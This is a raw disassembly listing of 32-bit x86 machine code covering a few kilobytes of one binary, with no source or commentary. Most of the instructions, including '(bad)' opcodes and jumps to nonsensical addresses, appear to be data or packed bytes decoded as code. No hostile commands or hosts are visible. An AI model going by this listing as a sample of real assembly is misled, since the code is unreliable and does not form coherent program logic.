  403e75:	add    BYTE PTR [eax],al
  403e77:	and    al,BYTE PTR ss:[eax]
  403e7a:	push   eax
  403e7b:	mov    cs,WORD PTR [eax]
  403e7d:	mov    eax,0x5c08a
  403e82:	adc    bl,BYTE PTR [eax]
  403e84:	add    eax,0x80111830
  403e89:	mov    ds:0x80012320,al
  403e8e:	mov    al,0xa6
  403e90:	or     BYTE PTR [ecx],al
  403e92:	or     dl,BYTE PTR [eax+0x21940220]
  403e98:	and    BYTE PTR [eax+0x60],0x8c
  403e9c:	or     BYTE PTR ds:0x80108806,ah
  403ea2:	sar    DWORD PTR [eax],0x14
  403ea5:	push   0x8
  403ea7:	or     al,0x90
  403ea9:	add    DWORD PTR [eax],edx
  403eab:	add    DWORD PTR [ecx+0x0],eax
  403eae:	mov    WORD PTR [eax+0x0],es
  403eb1:	add    BYTE PTR [eax],bh
  403eb3:	dec    ecx
  403eb4:	and    al,0x21
  403eb6:	adc    al,0x1
  403eb8:	add    BYTE PTR [eax],0xe2
  403ebb:	jb     0x403ebf
  403ebd:	xor    eax,DWORD PTR [eax-0x56]
  403ec0:	inc    eax
  403ec1:	mov    BYTE PTR [ebx+0xc02100],al
  403ec7:	add    dl,BYTE PTR [edx]
  403ec9:	adc    al,0x40
  403ecb:	pop    ecx
  403ecc:	add    BYTE PTR [esp+esi*4+0x41],ch
  403ed0:	mov    al,0x0
  403ed2:	ss fs add al,0x40
  403ed6:	dec    eax
  403ed7:	add    eax,DWORD PTR [edx+0xde09003]
  403edd:	add    BYTE PTR [eax],al
  403edf:	add    dl,BYTE PTR [edx]
  403ee1:	and    BYTE PTR ds:0xe800941,al
  403ee7:	and    BYTE PTR [eax-0x5a5b7df8],al
  403eed:	pusha  
  403eee:	push   es
  403eef:	add    DWORD PTR [ecx-0x80],esi
  403ef2:	(bad)  
  403ef3:	shl    BYTE PTR [eax+0x300064c],0x4
  403efa:	add    edx,DWORD PTR [ecx+ebx*1]
  403efd:	enter  0x15ff,0x44
  403f01:	mov    eax,ds:0x1a420044
  403f06:	add    BYTE PTR [eax],al
  403f08:	or     BYTE PTR [eax],al
  403f0a:	xor    BYTE PTR [eax+0x6b00cd00],al
  403f10:	imul   ecx,DWORD PTR [edx],0x88025203
  403f16:	arpl   WORD PTR [edx+eax*4],bp
  403f19:	inc    ecx
  403f1a:	xor    BYTE PTR [eax+eiz*1],0x20
  403f1e:	popf   
  403f1f:	dec    eax
  403f20:	fld    DWORD PTR [esi]
  403f22:	and    BYTE PTR [esi+0xc1008],al
  403f28:	test   BYTE PTR [edx],cl
  403f2a:	add    DWORD PTR [edx],esp
  403f2c:	ror    BYTE PTR [ecx+0x0],0xc6
  403f30:	and    BYTE PTR [esi],0x86
  403f33:	adc    BYTE PTR [edx+ecx*4],ah
  403f36:	add    eax,0x2270cb84
  403f3b:	add    cl,BYTE PTR [edi+0xc290933]
  403f41:	add    dl,BYTE PTR [ecx+0x26723a1]
  403f47:	pushf  
  403f48:	mov    ds:0xe6a00b4,al
  403f4d:	add    al,0x2
  403f4f:	add    BYTE PTR [eax],cl
  403f51:	pop    es
  403f52:	inc    edx
  403f53:	dec    esi
  403f54:	mov    dl,BYTE PTR [eax]
  403f56:	add    BYTE PTR [eax],al
  403f58:	arpl   WORD PTR [eax+0x24c02100],dx
  403f5e:	sub    eax,0xf1d03208
  403f63:	adc    BYTE PTR [edx+edi*1],ah
  403f66:	and    al,0x26
  403f68:	add    DWORD PTR [ecx+0x40d90200],0x74
  403f6f:	inc    esp
  403f70:	add    BYTE PTR [edx],al
  403f72:	and    edx,DWORD PTR [edi]
  403f74:	inc    eax
  403f75:	xchg   BYTE PTR [ecx],al
  403f77:	add    BYTE PTR [ebx+0x445c489],ch
  403f7d:	add    dl,al
  403f7f:	add    DWORD PTR [ebx],edx
  403f81:	sbb    al,BYTE PTR [ebx+0x4188a2c]
  403f87:	leave  
  403f88:	add    eax,0x19c4536c
  403f8d:	enter  0x1020,0x8
  403f91:	ret    0x210
  403f94:	add    BYTE PTR [eax-0x3fbff7df],ah
  403f9a:	add    BYTE PTR [ecx],al
  403f9c:	add    BYTE PTR [edx],0x8
  403f9f:	add    al,BYTE PTR [ecx]
  403fa1:	add    BYTE PTR [esi+0x5],cl
  403fa4:	cmp    ah,BYTE PTR [eax-0x1f4b4fec]
  403faa:	dec    eax
  403fab:	sbb    cl,BYTE PTR [eax]
  403fad:	mov    BYTE PTR [esi],al
  403faf:	nop
  403fb0:	add    al,0x45
  403fb2:	lods   al,BYTE PTR ds:[esi]
  403fb3:	dec    esp
  403fb4:	add    al,BYTE PTR [eax]
  403fb6:	rcr    DWORD PTR [eax],0x70
  403fb9:	mov    BYTE PTR [ecx],ah
  403fbb:	push   es
  403fbc:	sbb    BYTE PTR [eax+eax*1-0x7c],al
  403fc0:	add    DWORD PTR [edx+ebp*1],ecx
  403fc3:	add    dl,BYTE PTR ds:0x150006c0
  403fc9:	add    BYTE PTR [edx],al
  403fcb:	test   BYTE PTR [eax+0x122e1010],ah
  403fd1:	add    al,0x40
  403fd3:	inc    ecx
  403fd4:	mov    al,ds:0xa8c63000
  403fd9:	or     bh,BYTE PTR [edx+0x10]
  403fdc:	inc    ecx
  403fdd:	inc    esp
  403fde:	add    BYTE PTR [eax],cl
  403fe0:	sub    al,0x8
  403fe2:	add    BYTE PTR [ecx],cl
  403fe4:	or     al,0x4d
  403fe6:	nop
  403fe7:	and    BYTE PTR [ecx+0x3e],0x28
  403feb:	push   eax
  403fec:	inc    eax
  403fed:	ret    0x201
  403ff0:	adc    eax,0x8650102
  403ff5:	mov    al,ds:0x844021c0
  403ffa:	call   0x1415001
  403fff:	and    BYTE PTR [eax],ah
  404001:	mov    ds:0x526419,al
  404006:	pop    esp
  404007:	add    BYTE PTR [edx],al
  404009:	xor    al,0x28
  40400b:	imul   esi,DWORD PTR [ecx-0x5f],0x32046
  404012:	push   cs
  404013:	add    ch,BYTE PTR [eax]
  404015:	adc    DWORD PTR [eax+0x8010805],eax
  40401b:	adc    DWORD PTR [eax],eax
  40401d:	xor    BYTE PTR [eax+0x40],cl
  404020:	xor    BYTE PTR [esp+eax*1],0x20
  404024:	retf   0x11
  404027:	or     DWORD PTR [eax],0x80124c20
  40402d:	sub    DWORD PTR [eax],0x32878032
  404033:	add    DWORD PTR [ecx+eiz*2],esp
  404036:	add    BYTE PTR [ebx],dl
  404038:	add    ah,BYTE PTR [eax+eax*2]
  40403b:	add    BYTE PTR [eax+0x30034108],cl
  404041:	sub    DWORD PTR [ebp+0xe],esp
  404044:	adc    BYTE PTR [eax+edx*4],al
  404047:	cmp    BYTE PTR [ebx-0x76],0x1
  40404b:	push   es
  40404c:	jno    0x40408f
  40404e:	and    al,0xa8
  404050:	xchg   edx,eax
  404051:	ret    0x5a02
  404054:	push   ecx
  404055:	add    BYTE PTR [eax],al
  404057:	and    al,0x13
  404059:	and    eax,0x99209014
  40405e:	and    al,BYTE PTR [esp+ecx*2-0x7cf97f70]
  404065:	add    BYTE PTR [ebx],bl
  404067:	add    BYTE PTR [edx+0x284b8150],dl
  40406d:	sub    ax,0x400a
  404071:	add    BYTE PTR [ecx+0x50080029],ah
  404077:	xor    DWORD PTR [ecx+0x0],eax
  40407a:	and    BYTE PTR [eax],0x2
  40407d:	push   es
  40407e:	add    eax,0x1811003
  404083:	push   ds
  404084:	dec    ecx
  404085:	adc    DWORD PTR [edx+0x411a4109],esp
  40408b:	add    BYTE PTR [esp+ebp*4],cl
  40408e:	inc    edx
  40408f:	xchg   ecx,eax
  404090:	add    dh,BYTE PTR [eax]
  404092:	adc    DWORD PTR [edx],ebp
  404094:	add    BYTE PTR [edx],cl
  404096:	and    DWORD PTR [ebx],edx
  404098:	dec    edx
  404099:	add    al,BYTE PTR [ecx]
  40409b:	add    al,0x14
  40409d:	and    DWORD PTR [eax],eax
  40409f:	and    BYTE PTR [edx+eax*1],cl
  4040a2:	add    BYTE PTR [ecx],al
  4040a4:	push   cs
  4040a5:	push   eax
  4040a6:	adc    eax,DWORD PTR [ecx]
  4040a8:	add    BYTE PTR [eax+ecx*4],dl
  4040ab:	add    BYTE PTR [ecx],dl
  4040ad:	sbb    BYTE PTR [eax+eax*1-0x34],cl
  4040b1:	lock xor BYTE PTR [eax+0x48],al
  4040b5:	xchg   esp,eax
  4040b6:	pop    edx
  4040b7:	mov    BYTE PTR [ecx],dl
  4040b9:	or     al,al
  4040bb:	or     eax,0x1003b002
  4040c0:	add    DWORD PTR [ebx-0x7d],ebx
  4040c3:	inc    eax
  4040c4:	add    dl,al
  4040c6:	mov    WORD PTR [ecx],fs
  4040c8:	adc    BYTE PTR [edx],al
  4040ca:	inc    esi
  4040cb:	and    BYTE PTR [eax],0xc6
  4040ce:	mov    al,0x0
  4040d0:	xor    ch,al
  4040d2:	add    BYTE PTR [ecx],cl
  4040d4:	add    BYTE PTR [ebx],al
  4040d6:	add    BYTE PTR [eax+0xa],0x90
  4040da:	and    BYTE PTR [eax+eax*1],cl
  4040dd:	and    BYTE PTR [eax],dl
  4040df:	add    BYTE PTR [eax-0x27],0xb9
  4040e3:	add    DWORD PTR [eax],0x41d04221
  4040e9:	add    eax,0x544e3154
  4040ee:	add    cl,BYTE PTR [esi+0x50a00865]
  4040f4:	push   es
  4040f5:	cwde   
  4040f6:	test   BYTE PTR [eax+eiz*2],cl
  4040f9:	and    esi,DWORD PTR [eax]
  4040fb:	add    cl,dl
  4040fd:	inc    ecx
  4040fe:	add    BYTE PTR [eax],al
  404100:	pop    esi
  404101:	push   edi
  404102:	xor    BYTE PTR [edx-0xb],cl
  404105:	nop
  404106:	adc    BYTE PTR [eax],dl
  404108:	adc    ecx,eax
  40410a:	add    edx,DWORD PTR [eax]
  40410c:	add    al,BYTE PTR [ecx+ebx*1+0x1202af]
  404113:	inc    esp
  404114:	push   es
  404115:	and    BYTE PTR [eax],0x1
  404118:	or     eax,DWORD PTR [bx+si]
  40411b:	or     eax,0x2a94006
  404120:	or     BYTE PTR [esi],ch
  404122:	inc    eax
  404123:	pusha  
  404124:	add    BYTE PTR [ebx],al
  404126:	pop    eax
  404127:	add    dh,0x1
  40412a:	or     BYTE PTR [edx],dh
  40412c:	push   esp
  40412d:	add    dl,BYTE PTR [ebx]
  40412f:	sbb    DWORD PTR [eax+0x102223],0x840104a9
  404139:	test   eax,0x8029042
  40413e:	sub    al,BYTE PTR [ecx+0x48]
  404141:	and    BYTE PTR [eax-0x6fefffdf],0x80
  404148:	push   eax
  404149:	add    BYTE PTR [edx+ebx*1],al
  40414c:	xor    BYTE PTR [eax],cl
  40414e:	adc    BYTE PTR [esp+edx*8],dl
  404151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404152:	dec    eax
  404153:	sub    BYTE PTR ds:0x40420110,dl
  404159:	add    esp,ecx
  40415b:	push   esp
  40415c:	add    cl,BYTE PTR [eax+0x4a0202]
  404162:	and    BYTE PTR [ebx+0x51f30020],0x82
  404169:	xchg   edx,eax
  40416a:	mov    eax,0xa691008
  40416f:	xor    ecx,DWORD PTR [eax]
  404171:	daa    
  404172:	rol    DWORD PTR [eax+0x0],1
  404175:	xchg   ecx,eax
  404176:	xchg   ecx,eax
  404177:	pop    eax
  404178:	or     BYTE PTR [eax+0xf51000],0x41
  40417f:	add    ch,BYTE PTR [eax+0x10660c02]
  404185:	sub    dl,BYTE PTR [eax+edx*1+0x3da48900]
  40418c:	add    ch,BYTE PTR [edx]
  40418e:	inc    esi
  40418f:	add    eax,0x44417
  404194:	xor    eax,ecx
  404196:	or     al,BYTE PTR [edx+0x1a118120]
  40419c:	xchg   BYTE PTR [eax],al
  40419e:	add    BYTE PTR [ecx],0xa0
  4041a1:	mov    eax,ds:0x11a1825
  4041a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a7:	push   cs
  4041a8:	add    al,0x45
  4041aa:	and    al,0x80
  4041ac:	add    BYTE PTR [eax],cl
  4041ae:	dec    ecx
  4041af:	inc    esp
  4041b0:	add    BYTE PTR [edi+edx*1],0x2
  4041b4:	cmc    
  4041b5:	int3   
  4041b6:	adc    BYTE PTR [eax-0x7e3fdf58],al
  4041bc:	add    BYTE PTR [eax+0x0],ah
  4041bf:	dec    eax
  4041c0:	adc    BYTE PTR [eax],dl
  4041c2:	inc    eax
  4041c3:	and    BYTE PTR [ebx+edx*8+0x401a0946],0x8a
  4041cb:	inc    eax
  4041cc:	sub    al,0x41
  4041ce:	repnz and BYTE PTR ds:0x801808a,al
  4041d5:	add    BYTE PTR [ecx],cl
  4041d7:	xor    BYTE PTR fs:[eax],0x70
  4041db:	mov    ds:0xa42,al
  4041e0:	pusha  
  4041e1:	adc    al,BYTE PTR [eax]
  4041e3:	and    BYTE PTR [edx+0x20800000],al
  4041e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041ea:	pusha  
  4041eb:	cli    
  4041ec:	cmpxchg BYTE PTR [eax+0x69],al
  4041f0:	loopne 0x40420a
  4041f2:	mov    ds:0xa2188b8c,al
  4041f7:	and    BYTE PTR [edx],dl
  4041f9:	or     eax,0x48c91081
  4041fe:	inc    eax
  4041ff:	add    BYTE PTR [ecx],cl
  404201:	add    BYTE PTR [esi+0x10247925],al
  404207:	add    ah,BYTE PTR [eax+0x4000c050]
  40420d:	pop    eax
  40420e:	add    ah,BYTE PTR [eax]
  404210:	and    al,0x11
  404212:	mov    ds:0xfa403a20,al
  404217:	inc    eax
  404218:	shr    BYTE PTR [esp],1
  40421b:	add    DWORD PTR [eax],esi
  40421d:	dec    eax
  40421e:	push   0xca042400
  404223:	add    esp,eax
  404225:	adc    BYTE PTR [ebx],al
  404227:	push   eax
  404228:	add    DWORD PTR [eax],0x18004442
  40422e:	push   es
  40422f:	add    DWORD PTR [esi],0xffffffc2
  404232:	dec    eax
  404233:	and    BYTE PTR [eax],0x2
  404236:	push   es
  404237:	test   al,0x64
  404239:	add    al,0x1
  40423b:	rol    DWORD PTR [eax+0x2],0x90
  40423f:	add    DWORD PTR [eax+edx*1],ebx
  404242:	and    eax,0x4d
  404247:	adc    esp,eax
  404249:	push   es
  40424a:	mov    al,BYTE PTR [eax]
  40424c:	lds    eax,FWORD PTR [eax]
  40424e:	jb     0x4041d0
  404250:	adc    DWORD PTR [eax],ebx
  404252:	nop
  404253:	push   eax
  404254:	push   edx
  404255:	or     BYTE PTR [ecx+edx*4+0x2801368b],ah
  40425c:	or     BYTE PTR [eax],ah
  40425e:	add    dl,BYTE PTR [eax]
  404260:	push   cs
  404261:	and    cl,BYTE PTR [esi-0x7c]
  404264:	or     BYTE PTR [eax+0x64040398],ah
  40426a:	mov    al,ds:0x96400904
  40426f:	add    al,BYTE PTR [edx]
  404271:	add    BYTE PTR [eax],0x50
  404274:	adc    BYTE PTR [eax+0x1c00820c],cl
  40427a:	inc    esp
  40427b:	xor    al,0x90
  40427d:	or     ah,BYTE PTR [edx]
  40427f:	pusha  
  404280:	and    al,0xcc
  404282:	sbb    ah,al
  404284:	and    BYTE PTR [ecx],ah
  404286:	adc    al,dh
  404288:	test   DWORD PTR [eax],ecx
  40428a:	or     BYTE PTR [eax+eiz*1],0x0
  40428e:	pop    es
  40428f:	mov    eax,DWORD PTR [edx]
  404291:	sqrtps xmm0,xmm2
  404294:	add    al,0x4
  404296:	test   al,0xd0
  404298:	pop    ss
  404299:	or     BYTE PTR [eax+0x2],al
  40429c:	or     BYTE PTR [ecx],al
  40429e:	xor    ah,BYTE PTR [ecx]
  4042a0:	inc    ecx
  4042a1:	add    BYTE PTR [esi+eiz*1],al
  4042a4:	adc    eax,0xc4b0251
  4042a9:	xor    al,0x41
  4042ab:	sbb    BYTE PTR [edi],bl
  4042ad:	mov    BYTE PTR [eax+0x4],0xe2
  4042b1:	dec    eax
  4042b2:	adc    al,BYTE PTR [edx]
  4042b4:	add    ah,BYTE PTR [ecx]
  4042b6:	pop    edx
  4042b7:	or     DWORD PTR [esi],esp
  4042b9:	push   es
  4042ba:	pusha  
  4042bb:	fld    DWORD PTR [eax]
  4042bd:	or     BYTE PTR [eax+0x4a0218a1],al
  4042c3:	sub    BYTE PTR [eax+0x44],dh
  4042c6:	and    ecx,DWORD PTR [edx]
  4042c8:	or     al,0x34
  4042ca:	add    al,0x71
  4042cc:	add    al,0x22
  4042ce:	and    BYTE PTR [esi+eax*1+0x5600e30],bl
  4042d5:	and    BYTE PTR [eax],ah
  4042d7:	add    eax,DWORD PTR [ebx-0x80]
  4042da:	add    BYTE PTR es:[ebp+edx*1+0x200a2840],ch
  4042e2:	and    DWORD PTR [eax],eax
  4042e4:	inc    ebx
  4042e5:	adc    BYTE PTR [eax+0x4],0x8
  4042e9:	or     BYTE PTR [esi],0x80
  4042ec:	adc    BYTE PTR [edx],dl
  4042ee:	add    DWORD PTR [ecx],0x22020020
  4042f4:	and    BYTE PTR [eax],al
  4042f6:	pusha  
  4042f7:	add    ecx,DWORD PTR [ecx]
  4042f9:	test   al,0x11
  4042fb:	add    DWORD PTR [ecx],edi
  4042fd:	add    DWORD PTR [ecx+0x34008001],0x11
  404304:	test   DWORD PTR [edx+ebp*1],eax
  404307:	sub    DWORD PTR [ebp-0x7f],ecx
  40430a:	adc    DWORD PTR [eax+0x1200c2],eax
  404310:	sbb    DWORD PTR [ebx+0x1],ecx
  404313:	or     BYTE PTR [ecx],al
  404315:	or     BYTE PTR [eax],bh
  404317:	adc    al,BYTE PTR [edx+eax*1]
  40431a:	aam    0x88
  40431c:	push   es
  40431d:	adc    DWORD PTR [edx+0x40258b47],eax
  404323:	inc    edx
  404324:	inc    eax
  404325:	or     BYTE PTR [ecx+0xd040000],al
  40432b:	adc    dl,BYTE PTR [eax]
  40432d:	and    esp,DWORD PTR [eax]
  40432f:	add    BYTE PTR [esi+0x51],0xc6
  404333:	and    BYTE PTR [edx+edx*1-0x80],dh
  404337:	ret    0x4509
  40433a:	add    al,0xe2
  40433c:	add    al,0x92
  40433e:	and    BYTE PTR [eax+eax*1+0x78],al
  404342:	xchg   esp,eax
  404343:	add    BYTE PTR [ecx],al
  404345:	inc    eax
  404346:	and    BYTE PTR [eax],ah
  404348:	and    BYTE PTR [ecx+0x0],0x30
  40434c:	inc    ecx
  40434d:	add    DWORD PTR [eax],0xffffffaa
  404350:	push   eax
  404351:	xor    al,BYTE PTR [edx]
  404353:	sub    BYTE PTR [ecx],bl
  404355:	pusha  
  404356:	and    BYTE PTR [eax],0x84
  404359:	add    BYTE PTR [eax],al
  40435b:	add    al,0x14
  40435d:	dec    esp
  40435e:	and    DWORD PTR [eax],esp
  404360:	sub    BYTE PTR [ecx],ah
  404362:	sub    BYTE PTR [ecx],al
  404364:	adc    BYTE PTR [eax+0x0],dh
  404367:	push   esp
  404368:	test   DWORD PTR [eax+0x6],eax
  40436b:	add    BYTE PTR [eax+eax*2],0x10
  40436f:	add    dl,BYTE PTR [edx+0x18501004]
  404375:	add    BYTE PTR [eax],al
  404377:	xor    BYTE PTR [edx-0x7f],al
  40437a:	xchg   BYTE PTR [eax+0x11120d1],ah
  404380:	fdiv   DWORD PTR [edx+ebx*1+0x13]
  404384:	cmp    BYTE PTR [eax],bl
  404386:	adc    BYTE PTR [eax],al
  404388:	or     BYTE PTR [esp+eax*1],0x2
  40438c:	or     al,BYTE PTR [eax+0x2]
  40438f:	add    BYTE PTR [esi],al
  404391:	add    ah,BYTE PTR [eax]
  404393:	adc    BYTE PTR [ebx],cl
  404395:	es int3 
  404397:	and    DWORD PTR [eax-0x6f],0x18204721
  40439e:	sub    al,0x8d
  4043a0:	mov    BYTE PTR [ecx],dh
  4043a2:	mov    WORD PTR [eax+0x8],cs
  4043a5:	add    cl,ah
  4043a7:	mov    al,ds:0x8019432c
  4043ac:	add    BYTE PTR [edx],cl
  4043ae:	add    al,0x4
  4043b0:	daa    
  4043b1:	inc    esp
  4043b2:	add    BYTE PTR [eax+0xa],0x45
  4043b6:	inc    ecx
  4043b7:	add    BYTE PTR [eax-0x1e],dh
  4043ba:	xor    al,0x4c
  4043bc:	add    al,0x8c
  4043be:	and    BYTE PTR [eax+0x12],ah
  4043c1:	add    DWORD PTR [ecx-0x77],esp
  4043c4:	dec    esp
  4043c5:	add    BYTE PTR [eax],ah
  4043c7:	xchg   edx,eax
  4043c8:	and    DWORD PTR [ecx],esi
  4043ca:	adc    BYTE PTR [eax+0x24],0x7
  4043ce:	or     BYTE PTR [eax],bl
  4043d0:	inc    eax
  4043d1:	jb     0x4043f3
  4043d3:	and    BYTE PTR [eax],bl
  4043d5:	popa   
  4043d6:	add    BYTE PTR [eax],0x54
  4043d9:	arpl   WORD PTR [eax],ax
  4043db:	mov    ah,BYTE PTR [esi]
  4043dd:	inc    eax
  4043de:	adc    DWORD PTR [esp+eax*1],0x65418080
  4043e5:	ja     0x40442b
  4043e7:	test   BYTE PTR [eax+0x1444209b],dl
  4043ed:	fcom   DWORD PTR [eax]
  4043ef:	add    al,BYTE PTR [edx+edi*1+0x116a98c5]
  4043f6:	add    cl,BYTE PTR [eax-0x7cfdb9d7]
  4043fc:	inc    eax
  4043fd:	add    eax,0x1291b800
  404402:	or     BYTE PTR [eax+0x0],al
  404405:	push   ss
  404406:	dec    edi
  404407:	add    DWORD PTR [ecx+eiz*1+0x10],eax
  40440b:	mov    BYTE PTR [ecx+0x2],al
  40440e:	inc    ecx
  40440f:	add    BYTE PTR [esi],0x1
  404412:	and    al,0x21
  404414:	xor    BYTE PTR [eax],0x60
  404417:	out    0xb0,eax
  404419:	add    DWORD PTR [ecx],0x0
  40441c:	add    al,0x40
  40441e:	sbb    eax,0x9aa28002
  404423:	xor    BYTE PTR [ecx+0x383a0430],al
  404429:	add    BYTE PTR [ecx+0x1],bl
  40442c:	adc    BYTE PTR [eax+0x10929140],al
  404432:	mov    DWORD PTR [eax],eax
  404434:	mov    al,ds:0x56818862
  404439:	rol    BYTE PTR [edx+0x59],1
  40443c:	mov    es,WORD PTR cs:[eax]
  40443f:	add    BYTE PTR [eax],al
  404441:	add    eax,DWORD PTR [edx+0x42b6619]
  404447:	rcl    BYTE PTR [eax],cl
  404449:	ret    0xa9
  40444c:	and    al,BYTE PTR [ebx]
  40444e:	sbb    al,BYTE PTR [ecx+esi*2+0x2000a260]
  404455:	inc    esp
  404456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404457:	or     ah,bl
  404459:	push   edx
  40445a:	add    BYTE PTR [eax-0x6fdfe7f1],0x13
  404461:	inc    esi
  404462:	dec    eax
  404463:	and    dh,BYTE PTR [ebx-0x6f]
  404466:	sti    
  404467:	or     al,0x0
  404469:	mov    ds:0x8812028,eax
  40446e:	inc    eax
  40446f:	sub    BYTE PTR [eax+0x0],dl
  404472:	push   eax
  404473:	dec    edx
  404474:	sub    BYTE PTR [edi],ah
  404476:	pusha  
  404477:	xor    al,0x1
  404479:	push   eax
  40447a:	push   eax
  40447b:	mov    al,ds:0x5100a3b0
  404480:	bound  eax,QWORD PTR [ebx]
  404482:	jbe    0x404488
  404484:	adc    BYTE PTR [eax],cl
  404486:	(bad)  
  404487:	mov    BYTE PTR [edx],ah
  404489:	mov    al,0x2a
  40448b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40448c:	add    DWORD PTR [edi],eax
  40448e:	push   cs
  40448f:	mov    ds:0x31419411,al
  404494:	add    al,BYTE PTR [eax+0x4a25008d]
  40449a:	and    DWORD PTR [esp+ebp*4],esi
  40449d:	pop    es
  40449e:	sbb    BYTE PTR [eax+eax*8+0x102080a0],cl
  4044a5:	sub    al,0xa0
  4044a7:	sub    al,BYTE PTR [ecx]
  4044a9:	inc    eax
  4044aa:	xor    bl,dh
  4044ac:	loopne 0x40444f
  4044ae:	and    BYTE PTR [ecx],al
  4044b0:	and    al,0x12
  4044b2:	or     al,0x69
  4044b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044b5:	add    al,0x20
  4044b7:	add    BYTE PTR [ecx],ah
  4044b9:	push   0x98540741
  4044be:	add    BYTE PTR [esi-0x80],0x1
  4044c2:	push   esi
  4044c3:	add    DWORD PTR [ecx],ecx
  4044c5:	sbb    BYTE PTR [eax],al
  4044c7:	adc    bl,BYTE PTR [eax]
  4044c9:	add    BYTE PTR [eax],al
  4044cb:	add    ebp,DWORD PTR [esp+eax*8]
  4044ce:	push   ds
  4044cf:	adc    BYTE PTR [eax+0x40],dl
  4044d2:	je     0x404454
  4044d4:	add    dh,BYTE PTR [eax]
  4044d6:	and    eax,0x42224230
  4044db:	mov    ds:0x127d01,eax
  4044e0:	add    al,0x2
  4044e2:	sbb    BYTE PTR [edx+esi*1],0x80
  4044e6:	add    al,BYTE PTR [ecx+0x20262622]
  4044ec:	hlt    
  4044ed:	add    cl,BYTE PTR [edx]
  4044ef:	and    BYTE PTR [ecx-0x80],al
  4044f2:	test   cl,dl
  4044f4:	or     esi,DWORD PTR [eax]
  4044f6:	gs pushf 
  4044f8:	and    BYTE PTR [eax+0x28],0x24
  4044fc:	add    BYTE PTR [eax],al
  4044fe:	or     al,0x5a
  404500:	add    BYTE PTR [eax-0x7ffefbe7],ah
  404506:	add    BYTE PTR [eax+eax*2],al
  404509:	inc    esp
  40450a:	rol    BYTE PTR [ecx],1
  40450c:	test   BYTE PTR [eax],al
  40450e:	loopne 0x404518
  404510:	sbb    BYTE PTR [ecx],al
  404512:	xor    BYTE PTR [ebp+0x3],dh
  404515:	xchg   esp,eax
  404516:	xor    BYTE PTR [eax+0x25004100],dh
  40451c:	inc    eax
  40451d:	sub    DWORD PTR [edx-0x5c],eax
  404520:	ins    BYTE PTR es:[edi],dx
  404521:	add    BYTE PTR [eax+eax*2+0x289a002],dh
  404528:	and    BYTE PTR ds:0x44003cc2,al
  40452e:	sbb    al,0x53
  404530:	push   eax
  404531:	rcl    BYTE PTR [edx],0x81
  404534:	mov    DWORD PTR [ecx],ecx
  404536:	adc    BYTE PTR [edx],cl
  404538:	or     BYTE PTR [ecx],dl
  40453a:	fisttp DWORD PTR [edx]
  40453c:	or     al,BYTE PTR [ecx]
  40453e:	add    BYTE PTR ds:0x90002811,cl
  404544:	add    BYTE PTR [ecx-0x6b],0xc
  404548:	test   al,0x1
  40454a:	xor    DWORD PTR ds:0x212a0e9,0xd9020000
  404554:	add    ch,BYTE PTR [eax]
  404556:	xchg   esp,eax
  404557:	and    DWORD PTR [edx],ebp
  404559:	add    al,BYTE PTR [eax]
  40455b:	adc    al,0x1
  40455d:	adc    dh,BYTE PTR [eax-0x7ffbffd9]
  404563:	test   eax,0x8802c128
  404568:	cmp    BYTE PTR [eax-0x80],al
  40456b:	push   edx
  40456c:	sub    BYTE PTR [ebp+eiz*4+0x52bc2014],al
  404573:	ret    0x2051
  404576:	or     eax,DWORD PTR [ecx]
  404578:	add    BYTE PTR [eax],al
  40457a:	cmp    al,BYTE PTR [eax]
  40457c:	add    BYTE PTR [eax+eax*1+0x1a],al
  404580:	aad    0x23
  404582:	or     BYTE PTR [ecx-0x56fff5f8],bl
  404588:	imul   eax,DWORD PTR [edi],0xffffffb8
  40458b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40458c:	add    DWORD PTR [edx],0xffffff81
  40458f:	inc    eax
  404590:	add    DWORD PTR [ecx],eax
  404592:	add    BYTE PTR [eax+0x401a1210],0x2
  404599:	add    BYTE PTR [eax],al
  40459b:	push   cs
  40459c:	leave  
  40459d:	or     al,0x68
  40459f:	enter  0x2490,0x80
  4045a3:	popa   
  4045a4:	add    BYTE PTR [eax+0x382c0080],dh
  4045aa:	or     al,0x20
  4045ac:	mov    dl,BYTE PTR [eax+eax*1]
  4045af:	ror    esp,0x28
  4045b2:	and    al,BYTE PTR [eax+0x414033]
  4045b8:	add    BYTE PTR [eax+0xb41c9da],al
  4045be:	mov    DWORD PTR [edx],ebx
  4045c0:	inc    eax
  4045c1:	add    BYTE PTR [ebx],ah
  4045c3:	mov    cl,0x58
  4045c5:	sub    BYTE PTR [edx-0x44bfdde0],al
  4045cb:	sub    BYTE PTR [edx+0x54010941],0x1
  4045d2:	call   0x9986dd9
  4045d7:	call   0x4026:0xa265a754
  4045de:	adc    BYTE PTR [edx],al
  4045e0:	xchg   DWORD PTR [eax],edx
  4045e2:	inc    eax
  4045e3:	add    DWORD PTR [eax],edx
  4045e5:	pusha  
  4045e6:	or     BYTE PTR [ecx],ah
  4045e8:	adc    BYTE PTR [eax],dl
  4045ea:	add    bl,al
  4045ec:	or     BYTE PTR ds:0xe948,ch
  4045f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045f3:	pop    eax
  4045f4:	and    cl,BYTE PTR [ecx+0x6b804101]
  4045fa:	and    dl,BYTE PTR [esi-0x16ffaffa]
  404600:	add    eax,edx
  404602:	dec    eax
  404603:	cdq    
  404604:	add    al,0x91
  404606:	mov    al,ds:0x48f08015
  40460b:	add    BYTE PTR [eax-0x60],al
  40460e:	add    DWORD PTR [eax+eiz*8+0x8352016],esp
  404615:	or     al,0x20
  404617:	add    al,dl
  404619:	add    esi,DWORD PTR [ebx]
  40461b:	add    BYTE PTR [eax-0x70],0x80
  40461f:	dec    eax
  404620:	add    ah,BYTE PTR [eax+0x10]
  404623:	adc    eax,eax
  404625:	adc    BYTE PTR [eax],ah
  404627:	mov    es,WORD PTR [eax]
  404629:	or     al,0xda
  40462b:	and    BYTE PTR [eax],cl
  40462d:	add    al,0x3
  40462f:	dec    ecx
  404630:	add    BYTE PTR [edx-0x36],al
  404633:	rol    BYTE PTR [eax+ecx*1-0x60],0xa1
  404638:	push   esp
  404639:	or     BYTE PTR [eax],al
  40463b:	or     al,0x0
  40463d:	inc    edx
  40463e:	add    al,0x80
  404640:	inc    eax
